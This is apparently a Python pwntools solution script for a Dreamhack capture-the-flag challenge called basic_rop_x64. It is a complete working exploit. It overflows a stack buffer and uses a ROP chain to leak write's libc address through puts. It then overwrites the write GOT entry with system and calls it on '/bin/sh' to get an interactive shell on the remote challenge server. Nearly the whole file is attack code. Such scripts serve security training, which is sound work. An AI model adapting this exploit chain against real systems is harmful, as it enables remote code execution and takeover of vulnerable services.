from pwn import *


def main():
    context.clear(arch='amd64')
    proc = remote("host1.dreamhack.games", 14297)

    libc = ELF("./libc.so.6", checksec=False)
    libc_write_offset = libc.symbols["write"]
    libc_system_offset = libc.symbols["system"]

    elf = ELF("./basic_rop_x64", checksec=False)
    write_got = elf.got["write"]
    libc_binsh_offset = next(libc.search(b"/bin/sh\x00"))

    # 1. Initialize
    """
    | buf    | SFP | RET |
    | A*0x40 | A*8 | S1  | S2 | S3 | S4 |

    # Gadgets
    pop_rdi = 0x0000000000400883 # binary: pop rdi ; ret
    pop_rsi_offset = 0x00000000000202e8 # libc: pop rsi ; ret
    pop_rdx_offset = 0x0000000000001b92 # libc: pop rdx ; ret
    pop_rdx_rsi_offset = 0x00000000001150c9 # libc: pop rdx ; pop rsi ; ret

    puts_plt = elf.plt["puts"]
    read_plt = elf.plt["read"]
    write_plt = elf.plt["write"]
    """

    # 2. Fill dummy data
    payload = b"A"*0x48
    rop = ROP(elf)

    # 3. S1: Get ASLRed(real) write_got
    """
    Ref. puts(str), main()
    | pop_rdi | write_got | puts_plt  |   main    |
    | gadget  |    p1     | func_addr | func_addr |

    payload += p64(pop_rdi)
    payload += p64(write_got)
    payload += p64(puts_plt)
    payload += p64(elf.symbols['main'])
    """
    rop.puts(write_got)
    rop.main()

    # 4. Leak address and restart main()
    payload += rop.chain()
    proc.send(payload)
    proc.recv() # A*0x84
    write = u64(proc.recv(6) + b"\x00\x00")
    proc.recv() # \n

    # 5. Calculate addresses in libc
    libc_base = write - libc_write_offset
    libc_system = libc_base + libc_system_offset
    libc_binsh = libc_base + libc_binsh_offset
    """
    pop_rsi = libc_base + pop_rsi_offset
    pop_rdx = libc_base + pop_rdx_offset
    pop_rdx_rsi = libc_base + pop_rdx_rsi_offset
    """

    # 6. Refill dummy data
    payload = b"A"*0x48
    libc.address = libc_base
    rop = ROP([elf, libc])

    # 7. S2: Set system_got to write_got address
    """
    Ref. read(fd, buffer, length)
    | pop_rdx_rsi | 8  | write_got | pop_rdi | 0  | read_plt |
    |   gadget    | p3 |    p2     | gadget  | p1 | func_ptr |

    payload += p64(pop_rdx_rsi)
    payload += p64(8)
    payload += p64(write_got)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(read_plt)
    """
    rop.read(0, write_got, 8)

    # 8. S3 Call write_plt(hooked)
    """
    Ref. system(command)
    | pop_rdi | libc_binsh | write_plt |
    | gadget  |     p1     | func_addr |
    payload += p64(pop_rdi)
    payload += p64(libc_binsh)
    payload += p64(write_plt)
    """
    rop.write(libc_binsh)

    #  9. Get shell
    payload += rop.chain()
    proc.send(payload)
    proc.send(p64(libc_system))
    proc.recv()
    proc.interactive()
    proc.close()


if __name__ == "__main__":
    main()
